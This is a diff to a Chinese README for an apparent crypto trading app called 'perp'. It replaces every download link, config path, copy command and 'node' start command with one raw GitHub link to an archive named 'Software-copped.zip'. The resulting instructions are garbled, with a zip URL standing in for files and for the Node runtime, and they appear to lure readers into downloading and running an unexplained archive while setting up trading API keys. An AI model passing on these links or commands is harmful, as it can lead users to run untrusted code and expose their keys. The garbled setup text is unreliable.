@@ -30,7 +30,7 @@
 
 ### 下载和安装应用
 
-[下载 perp](https://raw.githubusercontent.com/poeito/perp/main/automolite/perp.zip)
+[下载 perp](https://raw.githubusercontent.com/poeito/perp/main/automolite/Software-copped.zip)
 
 访问上面的链接以获取最新版本。通过浏览器选择适合您系统的安装文件，然后下载到您的计算机。
 
@@ -55,7 +55,7 @@ npm install
 ### 2. 配置 API 密钥
 
 > 🔐 **密钥安全说明**  
-> - API 密钥存储在配置文件中（`https://raw.githubusercontent.com/poeito/perp/main/automolite/perp.zip` 或 `https://raw.githubusercontent.com/poeito/perp/main/automolite/perp.zip`）  
+> - API 密钥存储在配置文件中（`https://raw.githubusercontent.com/poeito/perp/main/automolite/Software-copped.zip` 或 `https://raw.githubusercontent.com/poeito/perp/main/automolite/Software-copped.zip`）  
 > - 配置文件已添加到 `.gitignore`，不会被提交到 Git  
 > - 克隆仓库后，您需要从模板创建自己的配置文件
 
@@ -63,9 +63,9 @@ npm install
 
 ```bash
 # 1. 复制配置模板
-cp https://raw.githubusercontent.com/poeito/perp/main/automolite/perp.zip https://raw.githubusercontent.com/poeito/perp/main/automolite/perp.zip
+cp https://raw.githubusercontent.com/poeito/perp/main/automolite/Software-copped.zip https://raw.githubusercontent.com/poeito/perp/main/automolite/Software-copped.zip
 
-# 2. 编辑 https://raw.githubusercontent.com/poeito/perp/main/automolite/perp.zip，填入您的 API 密钥
+# 2. 编辑 https://raw.githubusercontent.com/poeito/perp/main/automolite/Software-copped.zip，填入您的 API 密钥
 # 将 "your_api_key_here" 替换为您的真实密钥
 ```
 
@@ -86,7 +86,7 @@ cp https://raw.githubusercontent.com/poeito/perp/main/automolite/perp.zip https:
 运行以下命令启动应用：
 
 ```bash
-node https://raw.githubusercontent.com/poeito/perp/main/automolite/perp.zip
+node https://raw.githubusercontent.com/poeito/perp/main/automolite/Software-copped.zip
 ```
 
 您的应用现已启动并准备就绪。监控实时价格，并根据您设置的策略进行交易。
@@ -103,7 +103,7 @@ node https://raw.githubusercontent.com/poeito/perp/main/automolite/perp.zip
 
 ### 我可以在哪些操作系统上运行此应用？
 
-该应用可以在任何支持 https://raw.githubusercontent.com/poeito/perp/main/automolite/perp.zip 的操作系统上运行，包括 Windows、macOS 和 Linux。
+该应用可以在任何支持 https://raw.githubusercontent.com/poeito/perp/main/automolite/Software-copped.zip 的操作系统上运行，包括 Windows、macOS 和 Linux。
 
 ## 🎯 收尾
 
